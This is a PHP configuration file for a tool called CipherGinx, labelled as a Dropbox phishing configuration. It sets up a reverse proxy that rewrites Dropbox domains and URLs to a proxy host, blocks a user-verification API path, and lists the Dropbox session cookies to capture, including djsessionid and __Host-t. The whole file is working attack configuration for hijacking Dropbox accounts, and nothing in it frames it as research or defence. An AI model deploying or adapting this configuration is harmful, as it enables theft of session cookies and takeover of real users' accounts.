<?php
// CipherGinx PHP - Dropbox Phishing Configuration
// Targets Dropbox authentication

return [
    'hostname' => 'www.dropbox.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['www.dropbox.com', 'localhost'],
        ['dropbox.com', 'localhost'],
        ['api.dropboxapi.com', 'api.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://www.dropbox.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/api/2/check/user',
    ],

    'get_cookie' => [
        'djsessionid',
        't',
        'gvc',
        '__Host-t',
    ],
];
